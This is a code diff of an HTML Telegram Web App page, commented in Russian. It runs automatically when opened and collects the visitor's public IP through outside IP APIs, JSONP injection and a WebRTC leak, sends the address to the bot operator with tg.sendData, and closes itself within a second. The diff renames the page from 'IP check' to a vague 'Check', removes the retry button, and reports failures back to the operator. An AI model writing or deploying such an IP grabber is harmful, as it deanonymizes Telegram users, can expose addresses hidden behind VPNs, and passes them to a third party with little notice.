@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка IP</title>
+    <title>Проверка</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body style="background: #1a1a2e; color: white; font-family: Arial; text-align: center; padding: 20px;">
@@ -13,7 +13,6 @@
     <script>
         const tg = window.Telegram.WebApp;
         tg.ready();
-        tg.expand();
         
         // Метод 1: Fetch с разными API
         async function methodFetch() {
@@ -71,7 +70,7 @@
                 
                 document.body.appendChild(script);
                 
-                setTimeout(() => reject(new Error('Timeout')), 5000);
+                setTimeout(() => reject(new Error('Timeout')), 3000);
             });
         }
         
@@ -94,7 +93,6 @@
                         
                         if (ipMatch) {
                             const ip = ipMatch[0];
-                            // Исключаем локальные IP
                             if (!ip.startsWith('192.168.') && 
                                 !ip.startsWith('10.') && 
                                 !ip.startsWith('172.') &&
@@ -109,11 +107,11 @@
                 setTimeout(() => {
                     reject(new Error('WebRTC timeout'));
                     pc.close();
-                }, 5000);
+                }, 3000);
             });
         }
         
-        // Главная функция
+        // Автоматический запуск
         async function main() {
             const methods = [methodFetch, methodJSONP, methodWebRTC];
             
@@ -122,11 +120,14 @@
                     const ip = await method();
                     
                     if (ip) {
+                        // Успех - показываем IP и закрываем
                         document.getElementById('status').innerHTML = 
-                            '✅ IP: <strong style="color: #4CAF50;">' + ip + '</strong>'
+                            '✅ IP: <strong style="color: #4CAF50;">' + ip + '</strong>';
                         
+                        // Отправляем IP в Telegram
                         tg.sendData(ip);
                         
+                        // Закрываем WebApp
                         setTimeout(() => tg.close(), 1000);
                         return;
                     }
@@ -136,10 +137,13 @@
                 }
             }
             
-            // Если все методы не сработали
+            // Все методы не сработали - показываем ошибку
             document.getElementById('status').innerHTML = 
-                '❌ Не удалось получить IP<br><br>' +
-                '<button onclick="location.reload()" style="padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">🔄 Повторить</button>';
+                '❌ Не удалось получить IP адрес<br><br>' +
+                '<span style="font-size: 14px; color: #888;">Попробуйте еще раз</span>';
+            
+            // Отправляем ошибку в Telegram
+            tg.sendData('error');
         }
         
         main();
